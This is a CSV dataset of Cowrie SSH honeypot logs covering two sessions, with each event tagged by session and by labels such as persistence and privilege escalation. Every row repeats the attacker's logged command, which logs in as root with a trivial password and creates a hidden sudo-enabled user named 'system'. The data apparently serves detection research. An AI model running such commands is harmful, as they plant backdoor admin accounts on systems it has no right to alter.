,event,session_id,session,labels
0,"{""dst_ip"": ""10.42.6.15"", ""dst_port"": 2222.0, ""eventid"": ""cowrie.session.connect"", ""message"": ""New connection: 10.42.6.1:9628 (10.42.6.15:2222) [session: 09640f62f4b1]"", ""protocol"": ""ssh"", ""sensor"": ""cowrie-poli-worker-01-89bfdd5dd-v7wvn"", ""src_ip"": ""10.42.6.1"", ""src_port"": 9628.0, ""timestamp"": ""2025-08-07T15:27:15.528240Z"", ""session_id"": ""09640f62f4b1""}",09640f62f4b1,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 5rKBtPZw) system  && sudo usermod -aG sudo system ; openssl passwd -1 5rKBtPZw;,"['Initial access', 'Persistence', 'Privilege escalation']"
1,"{""eventid"": ""cowrie.client.version"", ""message"": ""Remote SSH version: SSH-2.0-Go"", ""sensor"": ""cowrie-poli-worker-01-89bfdd5dd-v7wvn"", ""src_ip"": ""10.42.6.1"", ""timestamp"": ""2025-08-07T15:27:15.529526Z"", ""version"": ""SSH-2.0-Go"", ""session_id"": ""09640f62f4b1""}",09640f62f4b1,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 5rKBtPZw) system  && sudo usermod -aG sudo system ; openssl passwd -1 5rKBtPZw;,"['Initial access', 'Persistence', 'Privilege escalation']"
2,"{""compCS"": [""none""], ""encCS"": [""aes128-gcm@openssh.com"", ""chacha20-poly1305@openssh.com"", ""aes128-ctr"", ""aes192-ctr"", ""aes256-ctr""], ""eventid"": ""cowrie.client.kex"", ""hash"": ""4e066189c3bbeec38c99b1855113733a"", ""hashAlgorithms"": ""curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group14-sha256,diffie-hellman-group14-sha1,ext-info-c;aes128-gcm@openssh.com,chacha20-poly1305@openssh.com,aes128-ctr,aes192-ctr,aes256-ctr;hmac-sha2-256-etm@openssh.com,hmac-sha2-256,hmac-sha1,hmac-sha1-96;none"", ""kexAlgs"": [""curve25519-sha256"", ""curve25519-sha256@libssh.org"", ""ecdh-sha2-nistp256"", ""ecdh-sha2-nistp384"", ""ecdh-sha2-nistp521"", ""diffie-hellman-group14-sha256"", ""diffie-hellman-group14-sha1"", ""ext-info-c""], ""keyAlgs"": [""rsa-sha2-512-cert-v01@openssh.com"", ""rsa-sha2-256-cert-v01@openssh.com"", ""ssh-rsa-cert-v01@openssh.com"", ""ssh-dss-cert-v01@openssh.com"", ""ecdsa-sha2-nistp256-cert-v01@openssh.com"", ""ecdsa-sha2-nistp384-cert-v01@openssh.com"", ""ecdsa-sha2-nistp521-cert-v01@openssh.com"", ""ssh-ed25519-cert-v01@openssh.com"", ""ecdsa-sha2-nistp256"", ""ecdsa-sha2-nistp384"", ""ecdsa-sha2-nistp521"", ""rsa-sha2-512"", ""rsa-sha2-256"", ""ssh-rsa"", ""ssh-dss"", ""ssh-ed25519""], ""langCS"": [""""], ""macCS"": [""hmac-sha2-256-etm@openssh.com"", ""hmac-sha2-256"", ""hmac-sha1"", ""hmac-sha1-96""], ""message"": ""SSH client hassh fingerprint: 4e066189c3bbeec38c99b1855113733a"", ""sensor"": ""cowrie-poli-worker-01-89bfdd5dd-v7wvn"", ""src_ip"": ""10.42.6.1"", ""timestamp"": ""2025-08-07T15:27:15.549105Z"", ""session_id"": ""09640f62f4b1""}",09640f62f4b1,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 5rKBtPZw) system  && sudo usermod -aG sudo system ; openssl passwd -1 5rKBtPZw;,"['Initial access', 'Persistence', 'Privilege escalation']"
3,"{""eventid"": ""cowrie.login.success"", ""message"": ""login attempt [root/0] succeeded"", ""password"": ""0"", ""sensor"": ""cowrie-poli-worker-01-89bfdd5dd-v7wvn"", ""src_ip"": ""10.42.6.1"", ""timestamp"": ""2025-08-07T15:27:15.611508Z"", ""username"": ""root"", ""session_id"": ""09640f62f4b1""}",09640f62f4b1,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 5rKBtPZw) system  && sudo usermod -aG sudo system ; openssl passwd -1 5rKBtPZw;,"['Initial access', 'Persistence', 'Privilege escalation']"
4,"{""arch"": ""linux-x64-lsb"", ""eventid"": ""cowrie.session.params"", ""message"": ""[]"", ""sensor"": ""cowrie-poli-worker-01-89bfdd5dd-v7wvn"", ""src_ip"": ""10.42.6.1"", ""timestamp"": ""2025-08-07T15:27:15.694447Z"", ""session_id"": ""09640f62f4b1""}",09640f62f4b1,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 5rKBtPZw) system  && sudo usermod -aG sudo system ; openssl passwd -1 5rKBtPZw;,"['Initial access', 'Persistence', 'Privilege escalation']"
5,"{""eventid"": ""cowrie.command.input"", ""input"": ""apt update && apt install sudo curl -y && sudo useradd -m -p $(openssl passwd -1 5rKBtPZw) system && sudo usermod -aG sudo system"", ""message"": ""CMD: apt update && apt install sudo curl -y && sudo useradd -m -p $(openssl passwd -1 5rKBtPZw) system && sudo usermod -aG sudo system"", ""sensor"": ""cowrie-poli-worker-01-89bfdd5dd-v7wvn"", ""src_ip"": ""10.42.6.1"", ""timestamp"": ""2025-08-07T15:27:15.696618Z"", ""session_id"": ""09640f62f4b1""}",09640f62f4b1,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 5rKBtPZw) system  && sudo usermod -aG sudo system ; openssl passwd -1 5rKBtPZw;,"['Initial access', 'Persistence', 'Privilege escalation']"
6,"{""eventid"": ""cowrie.command.input"", ""input"": ""openssl passwd -1 5rKBtPZw"", ""message"": ""CMD: openssl passwd -1 5rKBtPZw"", ""sensor"": ""cowrie-poli-worker-01-89bfdd5dd-v7wvn"", ""src_ip"": ""10.42.6.1"", ""timestamp"": ""2025-08-07T15:27:15.697511Z"", ""session_id"": ""09640f62f4b1""}",09640f62f4b1,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 5rKBtPZw) system  && sudo usermod -aG sudo system ; openssl passwd -1 5rKBtPZw;,"['Initial access', 'Persistence', 'Privilege escalation']"
7,"{""eventid"": ""cowrie.command.failed"", ""input"": ""openssl passwd -1 5rKBtPZw"", ""message"": ""Command not found: openssl passwd -1 5rKBtPZw"", ""sensor"": ""cowrie-poli-worker-01-89bfdd5dd-v7wvn"", ""src_ip"": ""10.42.6.1"", ""timestamp"": ""2025-08-07T15:27:15.698429Z"", ""session_id"": ""09640f62f4b1""}",09640f62f4b1,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 5rKBtPZw) system  && sudo usermod -aG sudo system ; openssl passwd -1 5rKBtPZw;,"['Initial access', 'Persistence', 'Privilege escalation']"
8,"{""duplicate"": false, ""duration"": ""0.0"", ""eventid"": ""cowrie.log.closed"", ""message"": ""Closing TTY Log: var/lib/cowrie/tty/dc2ddaeaa1f7b1a4e57d060fded143c67f51b40995bd0e9d4f96ba32ab9618f0 after 0.0 seconds"", ""sensor"": ""cowrie-poli-worker-01-89bfdd5dd-v7wvn"", ""shasum"": ""dc2ddaeaa1f7b1a4e57d060fded143c67f51b40995bd0e9d4f96ba32ab9618f0"", ""size"": 154.0, ""src_ip"": ""10.42.6.1"", ""timestamp"": ""2025-08-07T15:27:15.718701Z"", ""ttylog"": ""var/lib/cowrie/tty/dc2ddaeaa1f7b1a4e57d060fded143c67f51b40995bd0e9d4f96ba32ab9618f0"", ""session_id"": ""09640f62f4b1""}",09640f62f4b1,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 5rKBtPZw) system  && sudo usermod -aG sudo system ; openssl passwd -1 5rKBtPZw;,"['Initial access', 'Persistence', 'Privilege escalation']"
9,"{""duration"": ""0.2"", ""eventid"": ""cowrie.session.closed"", ""message"": ""Connection lost after 0.2 seconds"", ""sensor"": ""cowrie-poli-worker-01-89bfdd5dd-v7wvn"", ""src_ip"": ""10.42.6.1"", ""timestamp"": ""2025-08-07T15:27:15.719502Z"", ""session_id"": ""09640f62f4b1""}",09640f62f4b1,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 5rKBtPZw) system  && sudo usermod -aG sudo system ; openssl passwd -1 5rKBtPZw;,"['Initial access', 'Persistence', 'Privilege escalation']"
10,"{""dst_ip"": ""10.42.4.33"", ""dst_port"": 2222.0, ""eventid"": ""cowrie.session.connect"", ""message"": ""New connection: 10.42.4.1:31848 (10.42.4.33:2222) [session: 0805590cefbc]"", ""protocol"": ""ssh"", ""sensor"": ""cowrie-azure-worker-00-8ff84698d-4226n"", ""src_ip"": ""10.42.4.1"", ""src_port"": 31848.0, ""timestamp"": ""2025-08-11T07:28:52.235689Z"", ""session_id"": ""0805590cefbc""}",0805590cefbc,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 eBDaWCQN) system  && sudo usermod -aG sudo system ; openssl passwd -1 eBDaWCQN;,"['Initial access', 'Persistence', 'Privilege escalation']"
11,"{""eventid"": ""cowrie.client.version"", ""message"": ""Remote SSH version: SSH-2.0-Go"", ""sensor"": ""cowrie-azure-worker-00-8ff84698d-4226n"", ""src_ip"": ""10.42.4.1"", ""timestamp"": ""2025-08-11T07:28:52.236243Z"", ""version"": ""SSH-2.0-Go"", ""session_id"": ""0805590cefbc""}",0805590cefbc,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 eBDaWCQN) system  && sudo usermod -aG sudo system ; openssl passwd -1 eBDaWCQN;,"['Initial access', 'Persistence', 'Privilege escalation']"
12,"{""compCS"": [""none""], ""encCS"": [""aes128-gcm@openssh.com"", ""chacha20-poly1305@openssh.com"", ""aes128-ctr"", ""aes192-ctr"", ""aes256-ctr""], ""eventid"": ""cowrie.client.kex"", ""hash"": ""4e066189c3bbeec38c99b1855113733a"", ""hashAlgorithms"": ""curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group14-sha256,diffie-hellman-group14-sha1,ext-info-c;aes128-gcm@openssh.com,chacha20-poly1305@openssh.com,aes128-ctr,aes192-ctr,aes256-ctr;hmac-sha2-256-etm@openssh.com,hmac-sha2-256,hmac-sha1,hmac-sha1-96;none"", ""kexAlgs"": [""curve25519-sha256"", ""curve25519-sha256@libssh.org"", ""ecdh-sha2-nistp256"", ""ecdh-sha2-nistp384"", ""ecdh-sha2-nistp521"", ""diffie-hellman-group14-sha256"", ""diffie-hellman-group14-sha1"", ""ext-info-c""], ""keyAlgs"": [""rsa-sha2-512-cert-v01@openssh.com"", ""rsa-sha2-256-cert-v01@openssh.com"", ""ssh-rsa-cert-v01@openssh.com"", ""ssh-dss-cert-v01@openssh.com"", ""ecdsa-sha2-nistp256-cert-v01@openssh.com"", ""ecdsa-sha2-nistp384-cert-v01@openssh.com"", ""ecdsa-sha2-nistp521-cert-v01@openssh.com"", ""ssh-ed25519-cert-v01@openssh.com"", ""ecdsa-sha2-nistp256"", ""ecdsa-sha2-nistp384"", ""ecdsa-sha2-nistp521"", ""rsa-sha2-512"", ""rsa-sha2-256"", ""ssh-rsa"", ""ssh-dss"", ""ssh-ed25519""], ""langCS"": [""""], ""macCS"": [""hmac-sha2-256-etm@openssh.com"", ""hmac-sha2-256"", ""hmac-sha1"", ""hmac-sha1-96""], ""message"": ""SSH client hassh fingerprint: 4e066189c3bbeec38c99b1855113733a"", ""sensor"": ""cowrie-azure-worker-00-8ff84698d-4226n"", ""src_ip"": ""10.42.4.1"", ""timestamp"": ""2025-08-11T07:28:52.348560Z"", ""session_id"": ""0805590cefbc""}",0805590cefbc,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 eBDaWCQN) system  && sudo usermod -aG sudo system ; openssl passwd -1 eBDaWCQN;,"['Initial access', 'Persistence', 'Privilege escalation']"
13,"{""eventid"": ""cowrie.login.success"", ""message"": ""login attempt [root/0] succeeded"", ""password"": ""0"", ""sensor"": ""cowrie-azure-worker-00-8ff84698d-4226n"", ""src_ip"": ""10.42.4.1"", ""timestamp"": ""2025-08-11T07:28:52.822290Z"", ""username"": ""root"", ""session_id"": ""0805590cefbc""}",0805590cefbc,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 eBDaWCQN) system  && sudo usermod -aG sudo system ; openssl passwd -1 eBDaWCQN;,"['Initial access', 'Persistence', 'Privilege escalation']"
14,"{""arch"": ""linux-x64-lsb"", ""eventid"": ""cowrie.session.params"", ""message"": ""[]"", ""sensor"": ""cowrie-azure-worker-00-8ff84698d-4226n"", ""src_ip"": ""10.42.4.1"", ""timestamp"": ""2025-08-11T07:28:53.058332Z"", ""session_id"": ""0805590cefbc""}",0805590cefbc,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 eBDaWCQN) system  && sudo usermod -aG sudo system ; openssl passwd -1 eBDaWCQN;,"['Initial access', 'Persistence', 'Privilege escalation']"
15,"{""eventid"": ""cowrie.command.input"", ""input"": ""apt update && apt install sudo curl -y && sudo useradd -m -p $(openssl passwd -1 eBDaWCQN) system && sudo usermod -aG sudo system"", ""message"": ""CMD: apt update && apt install sudo curl -y && sudo useradd -m -p $(openssl passwd -1 eBDaWCQN) system && sudo usermod -aG sudo system"", ""sensor"": ""cowrie-azure-worker-00-8ff84698d-4226n"", ""src_ip"": ""10.42.4.1"", ""timestamp"": ""2025-08-11T07:28:53.058725Z"", ""session_id"": ""0805590cefbc""}",0805590cefbc,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 eBDaWCQN) system  && sudo usermod -aG sudo system ; openssl passwd -1 eBDaWCQN;,"['Initial access', 'Persistence', 'Privilege escalation']"
16,"{""eventid"": ""cowrie.command.input"", ""input"": ""openssl passwd -1 eBDaWCQN"", ""message"": ""CMD: openssl passwd -1 eBDaWCQN"", ""sensor"": ""cowrie-azure-worker-00-8ff84698d-4226n"", ""src_ip"": ""10.42.4.1"", ""timestamp"": ""2025-08-11T07:28:53.059045Z"", ""session_id"": ""0805590cefbc""}",0805590cefbc,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 eBDaWCQN) system  && sudo usermod -aG sudo system ; openssl passwd -1 eBDaWCQN;,"['Initial access', 'Persistence', 'Privilege escalation']"
17,"{""eventid"": ""cowrie.command.failed"", ""input"": ""openssl passwd -1 eBDaWCQN"", ""message"": ""Command not found: openssl passwd -1 eBDaWCQN"", ""sensor"": ""cowrie-azure-worker-00-8ff84698d-4226n"", ""src_ip"": ""10.42.4.1"", ""timestamp"": ""2025-08-11T07:28:53.059483Z"", ""session_id"": ""0805590cefbc""}",0805590cefbc,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 eBDaWCQN) system  && sudo usermod -aG sudo system ; openssl passwd -1 eBDaWCQN;,"['Initial access', 'Persistence', 'Privilege escalation']"
